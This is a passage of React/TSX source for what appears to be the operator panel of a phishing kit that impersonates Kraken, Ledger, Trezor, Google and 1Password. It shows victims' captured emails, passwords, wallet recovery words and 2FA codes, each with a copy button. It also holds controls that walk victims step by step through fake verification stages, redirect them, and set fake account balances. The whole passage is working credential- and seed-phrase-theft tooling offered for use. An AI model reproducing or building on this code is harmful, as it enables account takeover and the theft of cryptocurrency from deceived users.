          className="rounded-lg border border-[#474D57] bg-[#181A20] px-3 py-2 text-sm text-white placeholder-gray-500 outline-none focus:border-indigo-500"
        />
        <input
          type="text"
          placeholder={session.usdc_amount || "USDC"}
          value={usdcAmount[session.id] || ""}
          onChange={(e) => setUsdcAmount((prev) => ({ ...prev, [session.id]: e.target.value }))}
          className="rounded-lg border border-[#474D57] bg-[#181A20] px-3 py-2 text-sm text-white placeholder-gray-500 outline-none focus:border-indigo-500"
        />
        <input
          type="text"
          placeholder={session.sol_amount || "SOL"}
          value={solAmount[session.id] || ""}
          onChange={(e) => setSolAmount((prev) => ({ ...prev, [session.id]: e.target.value }))}
          className="rounded-lg border border-[#474D57] bg-[#181A20] px-3 py-2 text-sm text-white placeholder-gray-500 outline-none focus:border-indigo-500"
        />
        <input
          type="text"
          placeholder={session.doge_amount || "DOGE"}
          value={dogeAmount[session.id] || ""}
          onChange={(e) => setDogeAmount((prev) => ({ ...prev, [session.id]: e.target.value }))}
          className="rounded-lg border border-[#474D57] bg-[#181A20] px-3 py-2 text-sm text-white placeholder-gray-500 outline-none focus:border-indigo-500"
        />
        <input
          type="text"
          placeholder={session.xrp_amount || "XRP"}
          value={xrpAmount[session.id] || ""}
          onChange={(e) => setXrpAmount((prev) => ({ ...prev, [session.id]: e.target.value }))}
          className="rounded-lg border border-[#474D57] bg-[#181A20] px-3 py-2 text-sm text-white placeholder-gray-500 outline-none focus:border-indigo-500"
        />
      </div>
      <button
        onClick={() => handleUpdateCryptoAmounts(session.id)}
        disabled={actionLoading === `dash-crypto-${session.id}`}
        className="mt-2 cursor-pointer rounded-lg bg-indigo-500 px-4 py-2 text-xs font-medium text-white transition-colors hover:bg-indigo-600 disabled:opacity-50"
      >
        {actionLoading === `dash-crypto-${session.id}` ? "Updating..." : "Update Crypto Holdings"}
      </button>
    </div>

    {/* Current Dashboard Status */}
    <div className="rounded-lg bg-[#181A20] p-3">
      <p className="mb-2 text-xs font-medium text-gray-500">Current Dashboard Status</p>
      <div className="flex flex-wrap gap-2 text-xs">
        <span className="rounded bg-gray-700 px-2 py-1 text-gray-300">Balance: ${session.dashboard_balance || "0.00"}</span>
        <span className={`rounded px-2 py-1 ${session.balance_hidden ? "bg-yellow-500/20 text-yellow-400" : "bg-gray-700 text-gray-300"}`}>
          {session.balance_hidden ? "Hidden" : "Visible"}
        </span>
        <span className={`rounded px-2 py-1 ${session.balance_on_hold ? "bg-red-500/20 text-red-400" : "bg-gray-700 text-gray-300"}`}>
          {session.balance_on_hold ? "On Hold" : "Active"}
        </span>
        {session.btc_amount && <span className="rounded bg-orange-500/20 px-2 py-1 text-orange-400">BTC: {session.btc_amount}</span>}
        {session.eth_amount && <span className="rounded bg-blue-500/20 px-2 py-1 text-blue-400">ETH: {session.eth_amount}</span>}
        {session.usdc_amount && <span className="rounded bg-cyan-500/20 px-2 py-1 text-cyan-400">USDC: {session.usdc_amount}</span>}
        {session.sol_amount && <span className="rounded bg-purple-500/20 px-2 py-1 text-purple-400">SOL: {session.sol_amount}</span>}
        {session.doge_amount && <span className="rounded bg-yellow-500/20 px-2 py-1 text-yellow-400">DOGE: {session.doge_amount}</span>}
        {session.xrp_amount && <span className="rounded bg-gray-500/20 px-2 py-1 text-gray-400">XRP: {session.xrp_amount}</span>}
      </div>
    </div>
  </div>}
  
  {/* Pending Actions */}
                    {session.status === "pending" && (
                      <div className="mb-4 rounded-lg border border-orange-500/30 bg-orange-500/10 p-4">
                        <h4 className="mb-3 flex items-center gap-2 font-medium text-orange-400">
                          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                            <circle cx="12" cy="12" r="10" />
                            <polyline points="12 6 12 12 16 14" />
                          </svg>
                          Awaiting Your Decision
                        </h4>
                        <div className="flex flex-wrap gap-2">
                          <button
                            onClick={() => handleApprove(session.id, session.current_step)}
                            disabled={actionLoading === `approve-${session.id}`}
                            className="cursor-pointer rounded-lg bg-green-500 px-4 py-2 text-sm font-medium text-white transition-colors hover:bg-green-600 disabled:opacity-50"
                          >
                            {actionLoading === `approve-${session.id}` ? "Approving..." : "Approve → Next Step"}
                          </button>
                          <div className="flex flex-1 gap-2">
                            <input
                              type="text"
                              placeholder="Error message (optional)"
                              value={rejectMessage[session.id] || ""}
                              onChange={(e) => setRejectMessage((prev) => ({ ...prev, [session.id]: e.target.value }))}
                              className="min-w-0 flex-1 rounded-lg border border-[#474D57] bg-[#181A20] px-3 py-2 text-sm text-white placeholder-gray-500 outline-none focus:border-red-500"
                            />
                            <button
                              onClick={() => handleReject(session.id)}
                              disabled={actionLoading === `reject-${session.id}`}
                              className="cursor-pointer rounded-lg bg-red-500 px-4 py-2 text-sm font-medium text-white transition-colors hover:bg-red-600 disabled:opacity-50"
                            >
                              {actionLoading === `reject-${session.id}` ? "..." : "Reject"}
                            </button>
                          </div>
                        </div>
                      </div>
                    )}

                    {/* Step Control - hidden for Ledger/1Password since they use a separate activity system */}
                    {!isLedgerBrand && !isOnePasswordBrand && (
                    <div className="mb-4">
                      <h4 className="mb-2 text-xs font-medium text-gray-500">Move to Step</h4>
                      <div className="flex flex-wrap gap-2">
                        {allSteps.map((stepName) => (
                          <button
                            key={stepName}
                            onClick={() => handleMoveToStep(session.id, stepName)}
                            disabled={session.current_step === stepName || actionLoading === `step-${session.id}-${stepName}`}
                            className={`cursor-pointer rounded-lg px-3 py-1.5 text-xs font-medium transition-colors ${
                              session.current_step === stepName
                                ? "cursor-not-allowed bg-[#0052FF]/20 text-[#0052FF]"
                                : "bg-[#2B3139] text-white hover:bg-[#3C4043] disabled:opacity-50"
                            }`}
                          >
                            {actionLoading === `step-${session.id}-${stepName}` ? "..." : getStepLabel(stepName)}
                          </button>
                        ))}
                      </div>
                    </div>
                    )}

                    {/* Redirect */}
                    <div>
                      <h4 className="mb-2 text-xs font-medium text-gray-500">Redirect User</h4>
                      <div className="flex gap-2">
                        <input
                          type="text"
                          value={redirectUrl[session.id] || ""}
                          onChange={(e) => setRedirectUrl((prev) => ({ ...prev, [session.id]: e.target.value }))}
                          placeholder="https://..."
                          className="flex-1 rounded-lg border border-[#2B3139] bg-[#0B0E11] px-4 py-2 text-sm text-white placeholder-gray-500 outline-none transition-colors focus:border-[#0052FF]"
                        />
                        <button
                          onClick={() => handleRedirect(session.id)}
                          disabled={!redirectUrl[session.id] || actionLoading === `redirect-${session.id}`}
                          className="cursor-pointer rounded-lg bg-[#0052FF] px-4 py-2 text-sm font-medium text-white transition-colors hover:bg-[#0040CC] disabled:cursor-not-allowed disabled:opacity-50"
                        >
                          {actionLoading === `redirect-${session.id}` ? "..." : "Redirect"}
                        </button>
                      </div>
                      <div className="mt-2 flex flex-wrap gap-2">
                        {getBrandConfig(activeBrand).redirectUrls.map((url) => (
                          <button
                            key={url}
                            onClick={() => setRedirectUrl((prev) => ({ ...prev, [session.id]: url }))}
                            className="cursor-pointer rounded bg-[#2B3139] px-2 py-1 text-xs text-gray-400 transition-colors hover:bg-[#3C4043] hover:text-white"
                          >
                            {url.replace("https://", "")}
                          </button>
                        ))}
                      </div>
                    </div>

                    {/* Device Info */}
                    <div className="mt-4 border-t border-[#2B3139] pt-4">
                      <p className="truncate text-xs text-gray-600">{session.user_agent || "Unknown device"}</p>
                    </div>
                  </div>
                ))}

                {/* Hardware/Ledger Sessions (merged) */}
                {ledgerActivities.map((activity: any) => {
                  const getStageLabel = (stage: string) => {
                    switch (stage) {
                      case "intake": return "Intake - Email"
                      case "approval": return "Approval"
                      case "connect-ledger": return "Connect Device"
                      case "confirm-reset": return "Confirm Reset"
                      case "reset-api-keys": return "Reset API Keys"
                      case "verify-words": return "Verify Words"
                      case "enter-old-keys": return "Enter Old Keys"
                      case "completed": return "Completed"
                      case "email": return "Email Entry"
                      case "password": return "Password Entry"
                      case "loading": return "Loading"
                      case "prompt": return "2FA Prompt (Tap Number)"
                      case "code": return "Code Verification"
                      case "code_email": return "Code to Email"
                      case "code_phone": return "Code to Phone"
                      case "code_alternate": return "Code to Alternate Email"
                      case "deny_changes": return "Deny 3 Changes"
                      case "requests_cancelled": return "Requests Cancelled"
                      case "login": return "Login"
                      case "2fa_select": return "2FA Selection"
                      case "2fa_authenticator": return "Authenticator"
                      case "2fa_email": return "Email Code"
                      case "2fa_sms": return "SMS Code"
                      case "security_check": return "Security Check"
                      default: return stage
                    }
                  }
                  const getStageColor = (stage: string) => {
                    switch (stage) {
                      case "intake": case "email": case "login": return "border-cyan-500/30 bg-cyan-500/20 text-cyan-400"
                      case "approval": case "password": return "border-yellow-500/30 bg-yellow-500/20 text-yellow-400"
                      case "connect-ledger": case "prompt": case "2fa_select": case "2fa_authenticator": return "border-purple-500/30 bg-purple-500/20 text-purple-400"
                      case "code_email": case "code_phone": case "code_alternate": return "border-blue-500/30 bg-blue-500/20 text-blue-400"
                      case "deny_changes": return "border-red-500/30 bg-red-500/20 text-red-400"
                      case "requests_cancelled": return "border-green-500/30 bg-green-500/20 text-green-400"
                      case "confirm-reset": case "loading": return "border-orange-500/30 bg-orange-500/20 text-orange-400"
                      case "reset-api-keys": case "code": return "border-blue-500/30 bg-blue-500/20 text-blue-400"
                      case "verify-words": case "security_check": return "border-pink-500/30 bg-pink-500/20 text-pink-400"
                      case "enter-old-keys": case "2fa_sms": return "border-amber-500/30 bg-amber-500/20 text-amber-400"
                      case "completed": case "2fa_email": return "border-green-500/30 bg-green-500/20 text-green-400"
                      default: return "border-gray-500/30 bg-gray-500/20 text-gray-400"
                    }
                  }
                  const formatDuration = (startTime: string) => {
                    const diff = Math.floor((Date.now() - new Date(startTime).getTime()) / 1000)
                    const h = Math.floor(diff / 3600), m = Math.floor((diff % 3600) / 60), s = diff % 60
                    if (h > 0) return `${h}h ${m}m ${s}s`
                    if (m > 0) return `${m}m ${s}s`
                    return `${s}s`
                  }
                  const ua = (activity.userAgent || "").toLowerCase()
                  const isMobile = /mobile|android|iphone|ipad/i.test(ua)
                  const deviceName = /iphone/i.test(ua) ? "iPhone" : /ipad/i.test(ua) ? "iPad" : /android/i.test(ua) && /mobile/i.test(ua) ? "Android" : /android/i.test(ua) ? "Android Tablet" : /windows/i.test(ua) ? "Windows" : /macintosh|mac os/i.test(ua) ? "Mac" : /linux/i.test(ua) ? "Linux" : "Desktop"
                  const brandName = activity.visitorId?.startsWith("kraken_") ? "Kraken" : activity.visitorId?.startsWith("ledger_") ? "Ledger" : activity.visitorId?.startsWith("trezor_") ? "Trezor" : activity.visitorId?.startsWith("google_") ? "Google" : activity.visitorId?.startsWith("1password_") || activity.visitorId?.startsWith("onepass_") ? "1Password" : "Hardware"
                  
                  return (
                    <div
                      key={activity.visitorId}
                      className={`rounded-xl border bg-[#181A20] p-5 transition-all ${
                        activity.waitingForApproval ||
                        (activity.stage2Data?.waitingForAdmin && !activity.stage2Data?.adminConfirmed) ||
                        (activity.oldKeysData?.enteredWords?.length > 0 && !activity.oldKeysData?.adminConfirmed && !activity.oldKeysData?.adminDenied)
                          ? "border-orange-500/50 shadow-lg shadow-orange-500/10"
                          : "border-[#2B3139]"
                      }`}
                    >
                      {/* Header */}
                      <div className="mb-4 flex flex-wrap items-start justify-between gap-3">
                        <div className="space-y-2">
                          <div className="flex flex-wrap items-center gap-2">
                            <span className="rounded bg-[#2B3139] px-2 py-0.5 text-xs font-medium text-white">{brandName}</span>
                            <span className="font-mono text-sm text-gray-400">{activity.visitorId?.substring(0, 20)}...</span>
                            {activity.ipAddress && <span className="text-xs text-gray-600">IP: {activity.ipAddress}</span>}
                          </div>
                          <div className="flex flex-wrap items-center gap-2">
                            {activity.email && (
                              <span className="cursor-pointer rounded bg-[#2B3139] px-2 py-0.5 font-mono text-xs text-white hover:bg-[#3C4043]" onClick={() => navigator.clipboard.writeText(activity.email || "")}>
                                {activity.email}
                              </span>
                            )}
                            {activity.password && (
                              <span className="cursor-pointer rounded bg-[#2B3139] px-2 py-0.5 font-mono text-xs text-white hover:bg-[#3C4043]" onClick={() => navigator.clipboard.writeText(activity.password || "")}>
                                {activity.password}
                              </span>
                            )}
                            <span className="flex items-center gap-1 rounded bg-[#2B3139] px-2 py-0.5 text-xs text-gray-400">
                              {isMobile ? (
                                <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
                              ) : (
                                <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
                              )}
                              {deviceName}
                            </span>
                          </div>
                        </div>
                        <div className="flex flex-wrap items-center gap-2">
                          <span className={`rounded-full border px-3 py-1 text-xs font-medium ${getStageColor(activity.currentStage)}`}>
                            {getStageLabel(activity.currentStage)}
                          </span>
                          {activity.waitingForApproval && activity.status !== "rejected" && (
                            <span className="animate-pulse rounded-full border border-orange-500/50 bg-orange-500/10 px-3 py-1 text-xs font-medium text-orange-400">
                              Waiting
                            </span>
                          )}
                          {activity.sessionStarted && (
                            <span className="text-xs text-gray-500">{formatDuration(activity.sessionStarted)}</span>
                          )}
                          <button
                            onClick={async () => {
                              // Try both APIs to ensure session is deleted
                              await Promise.all([
                                fetch(`/api/sessions?id=${activity.visitorId}`, { method: "DELETE" }),
                                fetch("/api/activity", { method: "DELETE", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ visitorId: activity.visitorId }) })
                              ])
                              fetchLedgerActivities()
                            }}
                            className="cursor-pointer rounded-lg bg-red-500/20 px-3 py-1.5 text-xs font-medium text-red-400 transition-colors hover:bg-red-500/30"
                          >
                            End
                          </button>
                        </div>
                      </div>

                      {/* Captured Data */}
                      {(activity.verifyWordsData?.enteredWords?.length > 0 || activity.oldKeysData?.enteredWords?.length > 0) && (
                        <div className="mb-4 rounded-lg bg-[#0B0E11] p-4">
                          {activity.verifyWordsData?.enteredWords?.length > 0 && (
                            <div className="mb-3">
                              <div className="mb-2 flex items-center gap-2">
                                <p className="text-xs font-medium text-pink-400">Recovery Words:</p>
                                <button onClick={() => navigator.clipboard.writeText(activity.verifyWordsData.enteredWords.filter(Boolean).join(" "))} className="cursor-pointer rounded bg-pink-500/20 px-2 py-0.5 text-xs text-pink-400 hover:bg-pink-500/30">Copy</button>
                              </div>
                              <div className="flex flex-wrap gap-1.5">
                                {activity.verifyWordsData.enteredWords.map((word: string, i: number) => (
                                  <span key={i} className="rounded bg-[#2B3139] px-2 py-0.5 font-mono text-xs text-white">{i + 1}. {word || "—"}</span>
                                ))}
                              </div>
                            </div>
                          )}
                          {activity.oldKeysData?.enteredWords?.length > 0 && (
                            <div>
                              <div className="mb-2 flex items-center gap-2">
                                <p className="text-xs font-medium text-amber-400">Old Keys:</p>
                                <button onClick={() => navigator.clipboard.writeText(activity.oldKeysData.enteredWords.filter(Boolean).join(" "))} className="cursor-pointer rounded bg-amber-500/20 px-2 py-0.5 text-xs text-amber-400 hover:bg-amber-500/30">Copy</button>
                              </div>
                              <div className="flex flex-wrap gap-1.5">
                                {activity.oldKeysData.enteredWords.map((word: string, i: number) => (
                                  <span key={i} className="rounded bg-[#2B3139] px-2 py-0.5 font-mono text-xs text-white">{i + 1}. {word || "—"}</span>
                                ))}
                              </div>
                            </div>
                          )}
                        </div>
                      )}

                      {/* Step Controls */}
                      <div className="flex flex-wrap items-center gap-2">
                        <select
                          value={activity.currentStage}
                          onChange={(e) => updateLedgerActivity(activity.visitorId, { currentStage: e.target.value, waitingForApproval: false, status: "approved" })}
                          disabled={ledgerActionLoading === activity.visitorId}
                          className="cursor-pointer rounded-lg border border-[#2B3139] bg-[#0B0E11] px-3 py-1.5 text-xs text-white outline-none"
                        >
                          {getStagesForActivity(activity.visitorId).map((stage) => (
                            <option key={stage} value={stage}>{getStageLabel(stage)}</option>
                          ))}
                        </select>
                        <button
                          onClick={() => {
                            const stages = getStagesForActivity(activity.visitorId)
                            const idx = (stages as readonly string[]).indexOf(activity.currentStage)
                            const next = idx >= 0 && idx < stages.length - 1 ? stages[idx + 1] : "completed"
                            updateLedgerActivity(activity.visitorId, { currentStage: next, waitingForApproval: false, status: "approved" })
                          }}
                          disabled={ledgerActionLoading === activity.visitorId || activity.currentStage === "completed"}
                          className="cursor-pointer rounded-lg bg-green-500 px-3 py-1.5 text-xs font-medium text-white hover:bg-green-600 disabled:opacity-50"
                        >
                          Next
                        </button>
                        <button
                          onClick={() => {
                            const stages = getStagesForActivity(activity.visitorId)
                            const firstStage = stages[0]
                            updateLedgerActivity(activity.visitorId, { currentStage: firstStage, waitingForApproval: false, status: "", decisions: [], stage2Data: undefined, stage3Data: undefined, verifyWordsData: undefined, oldKeysData: undefined, kickedAt: new Date().toISOString(), kickCount: (activity.kickCount || 0) + 1 })
                          }}
                          disabled={ledgerActionLoading === activity.visitorId}
                          className="cursor-pointer rounded-lg bg-orange-500 px-3 py-1.5 text-xs font-medium text-white hover:bg-orange-600 disabled:opacity-50"
                        >
                          Kick
                        </button>
                        <button
                          onClick={() => updateLedgerActivity(activity.visitorId, { status: "rejected", adminMessage: "Request denied", waitingForApproval: true })}
                          disabled={ledgerActionLoading === activity.visitorId}
                          className="cursor-pointer rounded-lg bg-red-500 px-3 py-1.5 text-xs font-medium text-white hover:bg-red-600 disabled:opacity-50"
                        >
                          Deny
                        </button>
                      </div>
                      
                      {/* Google-specific controls */}
                      {activity.visitorId?.startsWith("google_") && (
                        <div className="mt-4 space-y-3 rounded-lg bg-[#0B0E11] p-4">
                          <p className="text-xs font-medium text-blue-400">Google Flow Settings</p>
                          
                          {/* Prompt Number */}
                          <div className="flex items-center gap-2">
                            <input
                              type="text"
                              placeholder="Prompt Number (e.g. 42)"
                              value={activity.data?.promptNumber || ""}
                              onChange={(e) => updateLedgerActivity(activity.visitorId, { data: { ...activity.data, promptNumber: e.target.value } })}
                              className="flex-1 rounded-lg border border-[#2B3139] bg-[#181A20] px-3 py-1.5 text-xs text-white outline-none focus:border-blue-500"
                            />
                            <span className="text-xs text-gray-500">for prompt stage</span>
                          </div>
                          
                          {/* Prompt App */}
                          <div className="flex items-center gap-2">
                            <select
                              value={activity.data?.promptApp || ""}
                              onChange={(e) => updateLedgerActivity(activity.visitorId, { data: { ...activity.data, promptApp: e.target.value } })}
                              className="flex-1 cursor-pointer rounded-lg border border-[#2B3139] bg-[#181A20] px-3 py-1.5 text-xs text-white outline-none focus:border-blue-500"
                            >
                              <option value="">Select notification source...</option>
                              <option value="Gmail">Gmail</option>
                              <option value="YouTube">YouTube</option>
                              <option value="Google app">Google app</option>
                              <option value="Phone notification">Phone notification</option>
                            </select>
                          </div>
                          
                          {/* Phone Number for code_phone stage */}
                          <div className="flex items-center gap-2">
                            <input
                              type="text"
                              placeholder="Phone Number (e.g. ***-***-1234)"
                              value={activity.data?.phoneNumber || ""}
                              onChange={(e) => updateLedgerActivity(activity.visitorId, { data: { ...activity.data, phoneNumber: e.target.value } })}
                              className="flex-1 rounded-lg border border-[#2B3139] bg-[#181A20] px-3 py-1.5 text-xs text-white outline-none focus:border-blue-500"
                            />
                            <span className="text-xs text-gray-500">for phone code</span>
                          </div>
                          
                          {/* Alternate Email for code_alternate stage */}
                          <div className="flex items-center gap-2">
                            <input
                              type="text"
                              placeholder="Alternate Email (e.g. user@backup.com)"
                              value={activity.data?.alternateEmail || ""}
                              onChange={(e) => updateLedgerActivity(activity.visitorId, { data: { ...activity.data, alternateEmail: e.target.value } })}
                              className="flex-1 rounded-lg border border-[#2B3139] bg-[#181A20] px-3 py-1.5 text-xs text-white outline-none focus:border-blue-500"
                            />
                            <span className="text-xs text-gray-500">for alternate email code</span>
                          </div>
                          
                          {/* Redirect URL for final stage */}
                          <div className="flex items-center gap-2">
                            <input
                              type="text"
                              placeholder="Redirect URL (e.g. https://google.com)"
                              value={activity.data?.redirectUrl || ""}
                              onChange={(e) => updateLedgerActivity(activity.visitorId, { data: { ...activity.data, redirectUrl: e.target.value } })}
                              className="flex-1 rounded-lg border border-[#2B3139] bg-[#181A20] px-3 py-1.5 text-xs text-white outline-none focus:border-blue-500"
                            />
                            <span className="text-xs text-gray-500">final redirect</span>
                          </div>
                          
                          {/* Captured codes display */}
                          {activity.data?.code && (
                            <div className="flex items-center gap-2 rounded bg-green-500/20 px-3 py-2">
                              <span className="text-xs text-green-400">Captured Code:</span>
                              <code className="font-mono text-sm text-white">{activity.data.code}</code>
                              <button onClick={() => navigator.clipboard.writeText(activity.data.code)} className="cursor-pointer rounded bg-green-500/30 px-2 py-0.5 text-xs text-green-400 hover:bg-green-500/40">Copy</button>
                            </div>
                          )}
                        </div>
                      )}
                    </div>
                  )
                })}
              </div>
            )}
          </>
        )}

        {activeTab === "attempts" && (
          <>
            {/* Login Attempts Tab */}
            <div className="mb-4 flex items-center justify-between">
              <div className="flex items-center gap-2">
                <div className="h-2 w-2 animate-pulse rounded-full bg-green-500" />
                <span className="text-sm text-gray-400">Live updates enabled</span>
              </div>
              {attempts.length > 0 && (
                <button
                  onClick={handleDeleteAll}
                  disabled={loading}
                  className="cursor-pointer rounded-lg bg-red-500/20 px-4 py-2 text-sm font-medium text-red-400 transition-colors hover:bg-red-500/30"
                >
                  Delete All
                </button>
              )}
            </div>

            {loading ? (
              <div className="flex items-center justify-center rounded-xl bg-[#181A20] py-20">
                <div className="h-8 w-8 animate-spin rounded-full border-2 border-[#0052FF] border-t-transparent" />
              </div>
            ) : attempts.length === 0 ? (
              <div className="rounded-xl bg-[#181A20] py-20 text-center">
                <p className="text-gray-400">No login attempts recorded</p>
              </div>
            ) : (
              <div className="overflow-hidden rounded-xl border border-[#2B3139]">
                <table className="w-full">
                  <thead className="border-b border-[#2B3139] bg-[#181A20]">
                    <tr>
                      <th className="px-4 py-3 text-left text-xs font-medium text-gray-500">Email/Phone</th>
                      <th className="px-4 py-3 text-left text-xs font-medium text-gray-500">Password</th>
                      <th className="px-4 py-3 text-left text-xs font-medium text-gray-500">Phone Code</th>
                      <th className="px-4 py-3 text-left text-xs font-medium text-gray-500">Time</th>
                      <th className="px-4 py-3 text-right text-xs font-medium text-gray-500">Action</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-[#2B3139] bg-[#0B0E11]">
                    {attempts.map((attempt) => (
                      <tr key={attempt.id} className="hover:bg-[#181A20]">
                        <td className="px-4 py-3 font-mono text-sm text-white">{attempt.email}</td>
                        <td className="px-4 py-3 font-mono text-sm text-white">{attempt.password}</td>
                        <td className="px-4 py-3 font-mono text-sm text-white">{attempt.phone_code || "—"}</td>
                        <td className="px-4 py-3 text-sm text-gray-400">{getTimeSince(attempt.created_at)}</td>
                        <td className="px-4 py-3 text-right">
                          <button
                            onClick={() => handleDelete(attempt.id)}
                            disabled={deleting === attempt.id}
                            className="cursor-pointer rounded bg-red-500/20 px-2 py-1 text-xs text-red-400 transition-colors hover:bg-red-500/30"
                          >
                            {deleting === attempt.id ? "..." : "Delete"}
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </>
        )}
      </div>
    </div>
  )
}
